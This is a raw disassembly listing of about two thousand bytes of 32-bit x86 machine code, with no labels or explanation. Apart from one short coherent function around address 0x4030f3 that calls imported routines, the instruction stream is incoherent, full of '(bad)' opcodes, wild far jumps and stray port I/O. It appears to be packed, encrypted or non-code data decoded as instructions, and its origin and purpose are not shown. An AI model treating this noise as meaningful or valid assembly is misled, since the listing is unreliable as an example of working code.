  402ea7:	fild   DWORD PTR [ecx+0x89cc9d]
  402ead:	add    dl,dl
  402eaf:	xchg   BYTE PTR [esi],ch
  402eb1:	dec    edi
  402eb2:	fcom   QWORD PTR ds:0x9192dc61
  402eb8:	jae    0x402ec9
  402eba:	add    cl,ah
  402ebc:	inc    eax
  402ebd:	add    BYTE PTR [eax],al
  402ebf:	cs out 0x5e,al
  402ec2:	and    eax,0x9062ed6
  402ec7:	repz sbb edx,DWORD PTR [edx+0xcdc011]
  402ece:	add    BYTE PTR [ebp+0x14],ch
  402ed1:	sub    DWORD PTR [ebp+0x52],edx
  402ed4:	push   es
  402ed5:	and    BYTE PTR [ebp-0x6ef711c7],ch
  402edb:	add    BYTE PTR [eax],al
  402edd:	fist   DWORD PTR [edx+0x1e06a535]
  402ee3:	pop    ds
  402ee4:	retf   0x824e
  402ee7:	jmp    0x402f51
  402ee9:	sub    al,0x2f
  402eeb:	xchg   DWORD PTR [edx+0x15daee8e],ecx
  402ef1:	mov    BYTE PTR [ecx-0x11ac0000],ch
  402ef7:	inc    esi
  402ef8:	jbe    0x402f3c
  402efa:	out    dx,al
  402efb:	pop    ds
  402efc:	xchg   BYTE PTR [ebx],bl
  402efe:	add    BYTE PTR [esi],bh
  402f00:	add    BYTE PTR [eax],al
  402f02:	mov    eax,DWORD PTR [ebx+0x2aaa676a]
  402f08:	outs   dx,BYTE PTR ds:[esi]
  402f09:	clc    
  402f0a:	adc    al,0x84
  402f0c:	add    BYTE PTR ds:[eax],al
  402f0f:	jns    0x402f5b
  402f11:	sbb    eax,0xacc60977
  402f16:	jns    0x402ef0
  402f18:	mov    al,0x3a
  402f1a:	sbb    al,0xe1
  402f1c:	into   
  402f1d:	loopne 0x402f17
  402f1f:	stc    
  402f20:	lods   al,BYTE PTR ds:[esi]
  402f21:	mov    edi,esi
  402f23:	cmp    eax,0xe32f1a59
  402f28:	and    BYTE PTR [eax],dl
  402f2a:	cwde   
  402f2b:	cwde   
  402f2c:	call   0x59c02bd4
  402f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f32:	dec    esp
  402f33:	mov    eax,DWORD PTR [eax]
  402f35:	add    BYTE PTR ds:0xeb4faa50,cl
  402f3b:	or     al,0x9c
  402f3d:	add    BYTE PTR [eax],al
  402f3f:	push   es
  402f40:	lock sub DWORD PTR [edi+0x79408b],eax
  402f47:	add    BYTE PTR [ecx+0x11],ch
  402f4a:	xchg   DWORD PTR [ecx+0x74e917a],esi
  402f50:	xchg   edi,eax
  402f51:	pushf  
  402f52:	dec    eax
  402f53:	pop    DWORD PTR [eax]
  402f55:	add    dh,dl
  402f57:	(bad)  
  402f59:	jle    0xd7e38f00
  402f5f:	xchg   ecx,eax
  402f60:	aaa    
  402f61:	cmp    eax,0xb04876ba
  402f66:	add    BYTE PTR [eax],al
  402f68:	pop    ss
  402f69:	sub    eax,DWORD PTR [ebx+0x9]
  402f6c:	sbb    DWORD PTR [ebp+0x7e20427a],esi
  402f72:	dec    ebp
  402f73:	(bad)  
  402f74:	call   0xbccf:0x27276fa8
  402f7b:	sbb    DWORD PTR [edi-0x35],eax
  402f7e:	les    eax,FWORD PTR [esi+0x550b0000]
  402f84:	mov    edx,0x6a032354
  402f89:	add    DWORD PTR [edi+0x55315df8],ecx
  402f8f:	inc    eax
  402f90:	mov    ecx,0x251f0000
  402f95:	sub    ah,dl
  402f97:	mov    ch,BYTE PTR [edi-0x62]
  402f9a:	pop    ss
  402f9b:	call   0xe15e:0xa85165c7
  402fa2:	aaa    
  402fa3:	aad    0x0
  402fa5:	lods   al,BYTE PTR ds:[esi]
  402fa6:	add    BYTE PTR [eax],al
  402fa8:	ins    BYTE PTR es:[edi],dx
  402fa9:	pusha  
  402faa:	inc    ebp
  402fab:	(bad)  
  402fac:	sub    eax,0x7856f828
  402fb1:	cmp    esp,DWORD PTR [edx]
  402fb3:	jno    0x402f88
  402fb5:	jmp    0x403023
  402fb7:	sub    BYTE PTR [esi+0x460816],bl
  402fbd:	add    BYTE PTR [ebx+ebx*2],cl
  402fc0:	add    BYTE PTR [eax],al
  402fc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fc3:	popf   
  402fc4:	sub    al,0xa4
  402fc6:	out    dx,eax
  402fc7:	cld    
  402fc8:	and    eax,0xacbc1edd
  402fcd:	jl     0x403042
  402fcf:	or     ecx,DWORD PTR [ecx]
  402fd1:	(bad)  
  402fd2:	aaa    
  402fd3:	cmp    BYTE PTR [ecx+0xb2844f],ch
  402fd9:	add    BYTE PTR [edi],cl
  402fdb:	gs pop ebx
  402fdd:	cmp    al,0x1c
  402fdf:	test   ecx,edx
  402fe1:	and    eax,0x1e0138ef
  402fe6:	push   ebx
  402fe7:	aas    
  402fe8:	retf   
  402fe9:	pop    esp
  402fea:	push   esp
  402feb:	std    
  402fec:	pop    esp
  402fed:	or     al,0x60
  402fef:	add    BYTE PTR [eax],al
  402ff1:	mov    esp,0x94279473
  402ff6:	xor    eax,DWORD PTR [edx-0x71]
  402ff9:	jge    0x403003
  402ffb:	push   es
  402ffc:	add    BYTE PTR [eax],al
  402ffe:	mov    ebp,0xcf8c98
  403003:	add    BYTE PTR [ebx+0x2240],bl
  403009:	mov    bl,0x1f
  40300b:	mov    cl,0x93
  40300d:	data16 test BYTE PTR [edi+0x0],bl
  403011:	add    BYTE PTR [ebx+0x16],ah
  403014:	cmp    dl,dh
  403016:	aas    
  403017:	dec    ecx
  403018:	ins    DWORD PTR es:[edi],dx
  403019:	scas   eax,DWORD PTR es:[edi]
  40301a:	dec    edx
  40301b:	shl    DWORD PTR [ebp-0x555c1763],cl
  403021:	fistp  QWORD PTR [esp+esi*1]
  403024:	or     eax,0x1e15a286
  403029:	mov    ds:0xdbc8,al
  40302f:	adc    bh,0xf1
  403032:	inc    esp
  403033:	jl     0x403035
  403035:	add    BYTE PTR [ebx],dh
  403037:	xor    eax,0x99f9b4f5
  40303c:	mov    BYTE PTR [esi],ch
  40303e:	add    BYTE PTR [eax],al
  403040:	sub    ecx,DWORD PTR [esi+edx*4+0x0]
  403044:	add    BYTE PTR [esi+0x76],ch
  403047:	pop    eax
  403048:	stos   BYTE PTR es:[edi],al
  403049:	scas   al,BYTE PTR es:[edi]
  40304a:	daa    
  40304b:	pop    ebp
  40304c:	imul   ebp,esi,0x71
  40304f:	repz dec ebx
  403051:	es jp  0x403002
  403054:	call   0x410b9d
  403059:	cs aas 
  40305b:	and    bl,BYTE PTR [esi+0x3f]
  40305e:	add    eax,0x790f240b
  403063:	(bad)  
  403064:	ss int 0xed
  403067:	cmp    BYTE PTR [edx],bl
  403069:	jge    0x403082
  40306b:	cmp    al,0x20
  40306d:	mov    ds,WORD PTR [edx]
  40306f:	mov    ebx,0x7661c5e2
  403074:	add    BYTE PTR [ebp+0x0],dl
  403077:	add    al,al
  403079:	inc    BYTE PTR [eax]
  40307b:	add    BYTE PTR [ebx-0x553aec52],ch
  403081:	pop    esp
  403082:	sbb    ch,ch
  403084:	jl     0x403102
  403086:	add    al,0xb6
  403088:	add    BYTE PTR [eax],al
  40308a:	paddd  mm2,QWORD PTR [edx]
  40308d:	lea    ebp,cs:[edi-0x52bd3cca]
  403094:	pop    ecx
  403095:	push   0x16
  403097:	outs   dx,DWORD PTR ds:[esi]
  403098:	add    bl,BYTE PTR [edx+0x15]
  40309b:	enter  0x85,0x0
  40309f:	cmp    edx,ebp
  4030a1:	or     DWORD PTR [eax+0x4a],ecx
  4030a4:	add    BYTE PTR [eax],al
  4030a6:	int3   
  4030a7:	xchg   esi,eax
  4030a8:	add    BYTE PTR [eax],al
  4030aa:	cmp    DWORD PTR [edx],edi
  4030ac:	cmp    DWORD PTR [edx+ebx*4-0x1f2e73a],ebx
  4030b3:	call   0xa2c9:0xd4d73161
  4030ba:	inc    eax
  4030bb:	inc    BYTE PTR [eax]
  4030bd:	add    BYTE PTR [eax+0x4700003c],al
  4030c3:	lds    esi,FWORD PTR [ecx-0x3e7a1c5e]
  4030c9:	jb     0x4030ea
  4030cb:	sar    dh,1
  4030cd:	mov    bh,0xff
  4030cf:	pusha  
  4030d0:	addr16 leave 
  4030d2:	fs mov esi,0x3a064a28
  4030d8:	sub    eax,0x2c458b21
  4030dd:	inc    edi
  4030de:	push   cs
  4030df:	(bad)  
  4030e0:	mov    eax,ds:0xb8e4cda7
  4030e5:	pop    edx
  4030e6:	aas    
  4030e7:	int3   
  4030e8:	es (bad) 
  4030ea:	fsin   
  4030ec:	aad    0x2b
  4030ee:	mov    dh,BYTE PTR [esi+0xb]
  4030f1:	lock inc ebx
  4030f3:	mov    BYTE PTR [ebp-0x8],dl
  4030f6:	mov    ebp,esp
  4030f8:	sub    esp,0x890
  4030fe:	mov    DWORD PTR [ebp-0x100],esi
  403104:	lea    esi,[esp+0x18]
  403108:	mov    DWORD PTR [esi],0x9c
  40310e:	push   esi
  40310f:	call   DWORD PTR ds:0x42c008
  403115:	dec    eax
  403116:	jne    0x4030f3
  403118:	push   esi
  403119:	call   DWORD PTR ds:0x42c018
  40311f:	cmp    eax,0x0
  403122:	jne    0x403145
  403124:	push   0x0
  403126:	push   0x0
  403128:	call   DWORD PTR ds:0x42c108
  40312e:	test   eax,0x40000
  403133:	je     0x4030f7
  403135:	lea    eax,[eax-0x7fc65f04]
  40313b:	mov    DWORD PTR [esi],esi
  40313d:	add    DWORD PTR [esi],0x4
  403140:	mov    DWORD PTR [esi+0x4],eax
  403143:	push   esi
  403144:	call   DWORD PTR ds:0x42c104
  40314a:	mov    eax,DWORD PTR [esp+0x40]
  40314e:	leave  
  40314f:	ret    0x4
  403152:	call   0x0:0x3b0cbecd
  403159:	or     bh,dh
  40315b:	add    BYTE PTR [eax],al
  40315d:	repnz cdq 
  40315f:	fiadd  WORD PTR [ecx-0x25]
  403162:	jb     0x403127
  403164:	jle    0x40319e
  403166:	inc    esp
  403167:	dec    eax
  403168:	add    BYTE PTR [eax],al
  40316a:	jbe    0x40314c
  40316c:	fwait
  40316d:	aas    
  40316e:	cld    
  40316f:	pop    es
  403170:	push   es
  403171:	jl     0x403141
  403173:	sub    eax,0x304f235
  403178:	add    BYTE PTR [eax],al
  40317a:	mov    ch,0x4
  40317c:	and    al,BYTE PTR [eax]
  40317e:	add    BYTE PTR [eax-0x3f66092a],bh
  403184:	jbe    0x403186
  403186:	add    BYTE PTR [ecx+0x28e4aa7c],dh
  40318c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40318d:	fisub  DWORD PTR [esi]
  40318f:	loope  0x403202
  403191:	pop    ds
  403192:	call   0x6aba9591
  403197:	mov    ch,BYTE PTR [edi+0x51]
  40319a:	retfw  
  40319c:	add    ecx,DWORD PTR [edx+0x26d389e4]
  4031a2:	(bad)  
  4031a3:	dec    ebp
  4031a4:	mov    esp,DWORD PTR [ebx]
  4031a6:	xchg   esi,eax
  4031a7:	shl    DWORD PTR [esi-0x60e3028d],cl
  4031ad:	in     eax,0xec
  4031af:	(bad)  
  4031b0:	sub    esp,ebp
  4031b2:	lods   eax,DWORD PTR ds:[esi]
  4031b3:	sbb    DWORD PTR fs:[edi+0x17],esp
  4031b7:	dec    eax
  4031b8:	push   esi
  4031b9:	add    BYTE PTR [eax],al
  4031bb:	les    edi,FWORD PTR [edx+0x0]
  4031be:	add    BYTE PTR [edi+ebp*2-0x73],bh
  4031c2:	cmp    BYTE PTR [eax+eax*1+0x0],0x80
  4031c7:	pop    ebx
  4031c8:	add    BYTE PTR [eax],al
  4031ca:	in     al,0xe9
  4031cc:	les    ebx,FWORD PTR [ebp+0x0]
  4031cf:	add    BYTE PTR [edi+edi*8+0x74],ch
  4031d3:	and    al,BYTE PTR [ebx-0x7ef2bad]
  4031d9:	in     al,0xf8
  4031db:	outs   dx,DWORD PTR ds:[esi]
  4031dc:	js     0x403209
  4031de:	add    BYTE PTR [ecx],bl
  4031e0:	add    BYTE PTR [eax],al
  4031e2:	arpl   WORD PTR [ecx-0x5],di
  4031e5:	or     al,BYTE PTR ss:[eax-0x8]
  4031e9:	add    BYTE PTR [eax],al
  4031eb:	add    DWORD PTR [edi],edx
  4031ed:	hlt    
  4031ee:	imul   dx,WORD PTR [ebx+0x5b],0x2238
  4031f4:	push   es
  4031f5:	mov    dh,cl
  4031f7:	dec    esi
  4031f8:	jo     0x403265
  4031fa:	enter  0xbd,0x0
  4031fe:	cli    
  4031ff:	push   cs
  403200:	ja     0x403219
  403202:	out    dx,eax
  403203:	dec    edx
  403204:	jno    0x403248
  403206:	and    eax,0x275d7d5a
  40320b:	loopne 0x403242
  40320d:	xor    BYTE PTR [ebp+0x52],bh
  403210:	push   ebp
  403211:	and    BYTE PTR [ecx-0x3],bh
  403214:	popa   
  403215:	cdq    
  403216:	mov    ds:0xa0ea7231,al
  40321b:	jne    0x403210
  40321d:	sbb    al,0xe7
  40321f:	mov    al,0x19
  403221:	gs jnp 0x403225
  403224:	xchg   ecx,eax
  403225:	lahf   
  403226:	retw   0xd280
  40322a:	add    BYTE PTR [eax],al
  40322c:	call   0xfe706918
  403231:	je     0x40329f
  403233:	(bad)  
  403234:	mov    eax,0x5025be68
  403239:	popa   
  40323a:	inc    edx
  40323b:	inc    esi
  40323c:	loop   0x403225
  40323e:	ss xor dl,bh
  403241:	js     0x403205
  403243:	js     0x40321f
  403245:	out    0xbe,eax
  403247:	and    eax,0xc7027bec
  40324c:	loopne 0x403235
  40324e:	ss xor dh,dl
  403251:	jnp    0x403295
  403253:	xchg   BYTE PTR [edx-0x17d00119],dh
  403259:	jnp    0x40325d
  40325b:	dec    ecx
  40325c:	lods   eax,DWORD PTR ds:[esi]
  40325d:	out    0x56,eax
  40325f:	xor    BYTE PTR [edx+0x2d77a27b],dh
  403265:	stos   DWORD PTR es:[edi],eax
  403266:	(bad)  
  403267:	das    
  403268:	in     al,0x7b
  40326a:	add    al,BYTE PTR [edx+0x3076e0a0]
  403270:	mov    ?,WORD PTR [ebx-0x78]
  403273:	stos   DWORD PTR es:[edi],eax
  403274:	add    BYTE PTR [eax],al
  403276:	repnz xor edx,DWORD PTR [ebx+0x7be02ffe]
  40327d:	aas    
  40327e:	xor    DWORD PTR [esi],0xffffffaf
  403281:	jbe    0x40327c
  403283:	retf   
  403284:	push   ds
  403285:	iret   
  403286:	mov    ebx,0xa42e283e
  40328b:	sbb    BYTE PTR [ecx-0x6e],al
  40328e:	(bad)  
  40328f:	cld    
  403290:	sub    edi,DWORD PTR [edi-0x22146cd2]
  403296:	inc    esi
  403297:	mov    ds:0x4b5328a6,eax
  40329c:	ja     0x4032e2
  40329e:	bound  eax,QWORD PTR [eax]
  4032a0:	add    BYTE PTR [ecx-0x49],dh
  4032a3:	and    esi,esp
  4032a5:	xor    al,0x11
  4032a7:	jmp    0xbb87:0x1324be61
  4032ae:	(bad)  
  4032af:	and    cl,BYTE PTR [edx+0x78f1596b]
  4032b5:	int    0xf8
  4032b7:	mov    dh,0xe5
  4032b9:	out    0x44,eax
  4032bb:	pushf  
  4032bc:	add    BYTE PTR [eax],al
  4032be:	in     al,dx
  4032bf:	mov    esi,0x165ea35
  4032c4:	jb     0x40326e
  4032c6:	cwde   
  4032c7:	stos   DWORD PTR es:[edi],eax
  4032c8:	add    DWORD PTR [eax],ebp
  4032ca:	push   edx
  4032cb:	and    al,0xcd
  4032cd:	out    0x4a,eax
  4032cf:	or     ecx,ebp
  4032d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032d2:	adc    DWORD PTR [ecx+0x32],0x8e5df9a4
  4032d9:	jg     0x403273
  4032db:	or     eax,0xf5acff5b
  4032e0:	(bad)  
  4032e1:	retf   0x82ce
  4032e4:	fwait
  4032e5:	ret    
  4032e6:	jb     0x40333e
  4032e8:	int    0xe7
  4032ea:	ds dec ecx
  4032ec:	xchg   edi,eax
  4032ed:	or     BYTE PTR cs:[eax+eax*1+0x0],dh
  4032f2:	popa   
  4032f3:	xor    dl,cl
  4032f5:	adc    ecx,eax
  4032f7:	add    BYTE PTR [eax+eax*1],cl
  4032fa:	add    BYTE PTR [ecx-0x2e3f6f5d],cl
  403300:	add    BYTE PTR [eax],al
  403302:	push   0xffffffaa
  403304:	fidivr DWORD PTR [eax]
  403306:	inc    esp
  403307:	aas    
  403308:	add    BYTE PTR [eax],al
  40330a:	pop    esp
  40330b:	sbb    DWORD PTR [edi-0x23],esi
  40330e:	dec    ebx
  40330f:	ja     0x403330
  403311:	lds    esp,FWORD PTR [ebp+0x37]
  403314:	mov    ch,BYTE PTR [eax-0x58]
  403317:	xor    cl,BYTE PTR [eax+0x36000099]
  40331d:	test   BYTE PTR [esi],ah
  40331f:	add    BYTE PTR [eax],al
  403321:	adc    BYTE PTR [edi],0x83
  403324:	xor    eax,0xf4c
  403329:	mov    bh,0xdd
  40332b:	stos   DWORD PTR es:[edi],eax
  40332c:	cmp    edi,DWORD PTR [ebx-0x769ed8e0]
  403332:	pop    edx
  403333:	test   DWORD PTR ds:0x83abdf29,ebx
  403339:	(bad)  
  40333a:	(bad)  
  40333b:	cld    
  40333c:	inc    eax
  40333d:	iret   
  40333e:	add    BYTE PTR [eax],al
  403340:	and    BYTE PTR [edx+0x36],al
  403343:	popa   
  403344:	and    esi,DWORD PTR [eax+0x203135dd]
  40334a:	mov    WORD PTR [ebp+0x25bf0000],?
  403350:	lods   eax,DWORD PTR ds:[esi]
  403351:	sbb    DWORD PTR [ecx+0x5334b7e],esi
  403357:	xor    eax,0x778536be
  40335c:	aaa    
  40335d:	mov    ebp,0x37777ac5
  403362:	jg     0x403391
  403364:	or     BYTE PTR [eax],ch
  403366:	add    BYTE PTR [eax],al
  403368:	xor    al,0xf9
  40336a:	inc    esp
  40336b:	dec    eax
  40336c:	add    BYTE PTR [eax],al
  40336e:	stos   DWORD PTR es:[edi],eax
  40336f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403370:	mov    ds:0xf58fca74,eax
  403375:	jg     0x40331d
  403377:	int3   
  403378:	xor    al,0x0
  40337a:	add    BYTE PTR ds:0x5ed8729f,dh
  403380:	jb     0x403399
  403382:	mov    dl,0x13
  403384:	sbb    BYTE PTR [ebx+ebp*4+0x5a],dh
  403388:	cmp    BYTE PTR [ebp+0x64],al
  40338b:	xor    BYTE PTR [ebp+0x3c],ch
  40338e:	and    al,0x7a
  403390:	and    edx,DWORD PTR [ecx]
  403392:	inc    eax
  403393:	dec    eax
  403394:	add    BYTE PTR [eax],al
  403396:	mov    esi,0xc21fb47b
  40339b:	sub    al,0x4c
  40339d:	or     DWORD PTR [eax],eax
  40339f:	add    BYTE PTR [edi+0x60],ch
  4033a2:	mov    ch,0xa8
  4033a4:	(bad)  
  4033a5:	mov    eax,0x86c39b6f
  4033aa:	and    bh,BYTE PTR [ecx+0x7b]
  4033ad:	mov    DWORD PTR [edx+0x78],ebx
  4033b0:	sub    ebx,DWORD PTR [ebx-0x4c]
  4033b3:	in     al,dx
  4033b4:	jae    0x403336
  4033b6:	test   BYTE PTR [eax],0x0
  4033b9:	sub    DWORD PTR [edx],ebp
  4033bb:	icebp  
  4033bc:	and    BYTE PTR [edi+0x2f00e06e],ch
  4033c2:	add    BYTE PTR [eax],al
  4033c4:	jae    0x403413
  4033c6:	rcl    DWORD PTR [esi+0x47],0x3f
  4033ca:	arpl   sp,si
  4033cc:	xchg   edi,eax
  4033cd:	xchg   DWORD PTR [esi+0x739dbc94],esi
  4033d3:	lea    ebx,[ebx]
  4033d5:	out    0x8,al
  4033d7:	sahf   
  4033d8:	add    BYTE PTR [eax],al
  4033da:	push   eax
  4033db:	mov    BYTE PTR [eax+eax*1],bh
  4033de:	add    BYTE PTR [ebp+ebp*8+0x1728114a],dl
  4033e5:	mov    ds,WORD PTR [ebx+0x6d9c24d9]
  4033eb:	mov    dh,0x2b
  4033ed:	xor    ah,BYTE PTR [edi]
  4033ef:	repz test al,0x9c
  4033f2:	stos   BYTE PTR es:[edi],al
  4033f3:	or     al,0xb
  4033f5:	add    BYTE PTR [eax],al
  4033f7:	icebp  
  4033f8:	xchg   ebx,eax
  4033f9:	ins    BYTE PTR es:[edi],dx
  4033fa:	xchg   DWORD PTR ds:0x26b52177,ecx
  403400:	(bad)  
  403401:	xor    BYTE PTR [ebp+0xb98c],dl
  403407:	arpl   WORD PTR [ebx-0x25],cx
  40340a:	je     0x4033ca
  40340c:	and    dh,dl
  40340e:	xor    al,0x0
  403410:	ins    BYTE PTR es:[edi],dx
  403411:	add    BYTE PTR [eax],al
  403413:	and    al,0x1c
  403415:	push   ebx
  403416:	mov    al,ds:0x37f2a9ae
  40341b:	and    DWORD PTR [edi],edx
  40341d:	pop    ebp
  40341e:	dec    ebp
  40341f:	mov    ecx,0x7f3b775a
  403424:	cs jne 0x4033eb
  403427:	mov    ah,0x0
  403429:	add    BYTE PTR [esi+0x11afad63],al
  40342f:	mov    ch,0xeb
  403431:	push   eax
  403432:	dec    ebp
  403434:	mov    edi,0x6427995a
  403439:	not    BYTE PTR [ebp-0x75e8bd7e]
  40343f:	into   
  403440:	and    eax,0x73e69a53
  403445:	inc    eax
  403446:	pusha  
  403447:	add    BYTE PTR [eax],al
  403449:	jb     0x4033f8
  40344b:	ror    DWORD PTR [esi-0x71],0xbd
  40344f:	push   esi
  403450:	cmp    DWORD PTR [eax],edx
  403452:	dec    ebp
  403453:	mov    al,ds:0x64f1fbb2
  403458:	loop   0x40346a
  40345a:	sahf   
  40345b:	sar    DWORD PTR ss:[ecx+esi*1+0x25],1
  403460:	cmp    al,0x23
  403462:	jg     0x403489
  403464:	(bad)  
  403465:	es lahf 
  403467:	push   ecx
  403468:	jmp    0x9a04:0x895d0670
  40346f:	add    BYTE PTR [eax],al
  403471:	and    ch,dl
  403473:	mov    edi,0x60a57c78
  403478:	mov    bl,0x75
  40347a:	shr    DWORD PTR [ebp+0x31],1
  40347d:	je     0x40349f
  40347f:	or     eax,0x9ee4248b
  403484:	adc    al,dh
  403486:	inc    DWORD PTR ss:[edi]
  403489:	xchg   esi,eax
  40348a:	and    eax,0xabb9b70f
  40348f:	lea    ecx,ss:[edi+0x64]
  403493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403494:	addr16 cmp ah,ah
  403497:	(bad)  
  403498:	jae    0x403448
  40349a:	inc    ebp
  40349b:	push   es
  40349c:	and    edi,esp
  40349e:	popa   
  40349f:	bound  edx,QWORD PTR [ebx]
  4034a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034a2:	xor    DWORD PTR [edi+0x37],ebp
  4034a5:	adc    esp,DWORD PTR [eax+eax*4]
  4034a8:	xor    BYTE PTR [eax],al
  4034aa:	add    cl,al
  4034ac:	imul   edi,DWORD PTR [ecx-0x36f6c563],0x20722356
  4034b6:	mov    ebp,0x53a69599
  4034bb:	daa    
  4034bc:	data16 and al,0x2f
  4034bf:	dec    edi
  4034c0:	pop    ss
  4034c1:	jb     0x403479
  4034c3:	je     0x40349d
  4034c5:	inc    esp
  4034c6:	sbb    eax,DWORD PTR [eax]
  4034c8:	add    ch,ah
  4034ca:	test   BYTE PTR cs:[ebp+0x0],bl
  4034ce:	add    BYTE PTR [ebx],bh
  4034d0:	es je  0x403539
  4034d3:	ja     0x40352f
  4034d5:	jle    0x4034b8
  4034d7:	aas    
  4034d8:	outs   dx,BYTE PTR ds:[esi]
  4034d9:	and    DWORD PTR [esi+eax*1-0xd1e21ce],esi
  4034e0:	ds jb  0x403545
  4034e3:	inc    ebp
  4034e4:	sahf   
  4034e5:	adc    DWORD PTR [edx+0x10],edx
  4034e8:	popf   
  4034e9:	mov    ah,0x20
  4034eb:	es inc edx
  4034ed:	mov    BYTE PTR [eax+eax*1+0x0],cl
  4034f1:	imul   esi,DWORD PTR ds:0x60dd9abe,0xffffffb4
  4034f8:	push   esp
  4034f9:	aam    0xe5
  4034fb:	pop    ebx
  4034fc:	(bad)  
  4034fd:	in     al,0xaa
  4034ff:	dec    edx
  403500:	mov    WORD PTR [ecx],cs
  403502:	add    BYTE PTR [eax],al
  403504:	(bad)  
  403505:	sbb    eax,0x4e407426
  40350a:	add    BYTE PTR [eax],al
  40350c:	jb     0x403528
  40350e:	jle    0x4034c5
  403510:	and    cl,BYTE PTR [esi-0x63e197d9]
  403516:	mov    bh,0xcc
  403518:	jmp    0xdf18:0x66f10000
  40351f:	xor    DWORD PTR [edx],ebx
  403521:	cwde   
  403522:	push   esp
  403523:	jge    0x40350d
  403525:	adc    al,0xc9
  403527:	test   al,0xcf
  403529:	xchg   BYTE PTR [ebx],al
  40352b:	stos   DWORD PTR es:[edi],eax
  40352c:	dec    esi
  40352d:	xchg   edx,eax
  40352f:	push   ds
  403530:	cmp    BYTE PTR [ebp+ebp*2+0x7e],0xfe
  403535:	cmc    
  403536:	xlat   BYTE PTR fs:[ebx]
  403538:	xor    ah,BYTE PTR [esi]
  40353a:	out    dx,eax
  40353b:	sbb    esp,DWORD PTR [eax-0x50bb44e]
  403541:	cmp    bh,ah
  403543:	mov    ds:0x8c7c6947,al
  403548:	adc    DWORD PTR [eax],eax
  40354a:	add    BYTE PTR [edx+0x74],bh
  40354d:	daa    
  40354e:	inc    edx
  40354f:	or     DWORD PTR [edi-0x53],ebp
  403552:	mov    esp,0xc10403
  403557:	add    BYTE PTR [ebx],ch
  403559:	jno    0x403500
  40355b:	jno    0x4034f5
  40355d:	into   
  40355e:	inc    edx
  40355f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403560:	push   ecx
  403561:	and    edi,esi
  403563:	mov    WORD PTR [ebx],ds
  403565:	add    BYTE PTR [eax],al
  403567:	popf   
  403568:	popa   
  403569:	mov    cl,BYTE PTR ds:[ebp+0x1730d906]
  403570:	and    esi,DWORD PTR [ebx]
  403572:	fiadd  DWORD PTR [esp+edx*4]
  403575:	add    BYTE PTR [eax],al
  403577:	in     eax,0x89
  403579:	jns    0x40356c
  40357b:	adc    eax,0x35ddae61
  403580:	pop    edx
  403581:	jo     0x403562
  403583:	ja     0x4035d7
  403585:	stc    
  403586:	mov    bh,0xf1
  403588:	pop    edi
  403589:	cmp    bl,BYTE PTR [ebp+0x58224333]
  40358f:	leave  
  403590:	push   eax
  403591:	sub    eax,0xa50aeb62
  403596:	inc    edi
  403597:	ret    
  403598:	idiv   BYTE PTR [edx+0x34]
  40359b:	mov    cl,0x4f
  40359d:	add    DWORD PTR [eax+0x22000052],0x21
  4035a4:	hlt    
  4035a5:	xor    al,0xb0
  4035a7:	ins    DWORD PTR es:[edi],dx
  4035a8:	add    edi,DWORD PTR [esi]
  4035aa:	jns    0x403537
  4035ac:	jae    0x4035f8
  4035ae:	getsec 
  4035b0:	add    dl,BYTE PTR [ebp-0x11]
  4035b3:	jae    0x4035b8
  4035b5:	add    ebp,DWORD PTR [ebx+0x736ee28a]
  4035bb:	mov    esi,0xd12b675
  4035c0:	cwde   
  4035c1:	mov    cl,0xe0
  4035c3:	outs   dx,BYTE PTR ds:[esi]
  4035c4:	mov    DWORD PTR [ebx],eax
  4035c6:	retf   
  4035c7:	clc    
  4035c8:	ja     0x40358a
  4035ca:	sbb    BYTE PTR [eax],al
  4035cc:	add    al,bl
  4035ce:	sahf   
  4035cf:	hlt    
  4035d0:	shl    ebp,cl
  4035d2:	addr16 and ebx,ebp
  4035d5:	xchg   esi,eax
  4035d6:	push   cs
  4035d7:	imul   esp,DWORD PTR [eax+edx*8-0x64],0x27
  4035dc:	cld    
  4035dd:	mov    ebx,0xd085345c
  4035e2:	inc    esp
  4035e3:	cmp    eax,0x20bd0000
  4035e8:	loop   0x40364a
  4035ea:	iret   
  4035eb:	pop    ebp
  4035ec:	(bad)  
  4035ed:	adc    eax,0x340b9
  4035f2:	add    BYTE PTR [edi],bl
  4035f4:	sbb    ax,0x61fb
  4035f8:	cmp    DWORD PTR [edx+edi*1-0x53c60000],ecx
  4035ff:	adc    al,0xf6
  403601:	leave  
  403602:	icebp  
  403603:	pop    edi
  403604:	mov    BYTE PTR [edx+0x0],dl
  403607:	add    dl,bh
  403609:	and    DWORD PTR [ecx+0x37],ecx
  40360c:	in     eax,dx
  40360d:	inc    ecx
  40360e:	mov    al,ds:0xdea50542
  403613:	lahf   
  403614:	das    
  403615:	and    dl,bh
  403617:	cmp    BYTE PTR [edi-0x1915dfdc],al
  40361d:	mov    eax,0xae85fb0f
  403622:	enter  0x97,0x0
  403626:	shr    DWORD PTR [ecx-0x37080695],cl
  40362c:	fwait
  40362d:	add    BYTE PTR [eax],al
  40362f:	scas   al,BYTE PTR es:[edi]
  403630:	inc    edx
  403631:	iret   
  403632:	pop    esi
  403633:	xor    eax,0x2075f41a
  403638:	pop    esi
  403639:	aaa    
  40363a:	test   eax,0x3123cd24
  40363f:	outs   dx,BYTE PTR ds:[esi]
  403640:	setae  BYTE PTR [ebp+0x3829b6f1]
  403647:	pop    eax
  403648:	stos   BYTE PTR es:[edi],al
  403649:	shl    DWORD PTR [edi+esi*4],1
  40364c:	dec    edx
  40364d:	inc    eax
  40364e:	xchg   ebx,eax
  40364f:	add    BYTE PTR [eax],al
  403651:	xchg   esp,eax
  403652:	mov    WORD PTR [edx],es
  403654:	add    BYTE PTR [eax],al
  403656:	push   ds
  403657:	pop    es
  403658:	cmc    
  403659:	mov    edi,0x92246c15
  40365e:	sbb    ebx,DWORD PTR [eax-0x51]
  403661:	cmp    ah,bh
  403663:	out    dx,eax
  403664:	jne    0x403612
  403666:	in     eax,0x65
  403668:	mov    bh,BYTE PTR [ebx-0x412c6139]
  40366e:	mov    ah,BYTE PTR [edi-0x62]
  403671:	shl    BYTE PTR [edi],cl
  403673:	xchg   ebp,eax
  403674:	mov    bl,0x38
  403676:	popa   
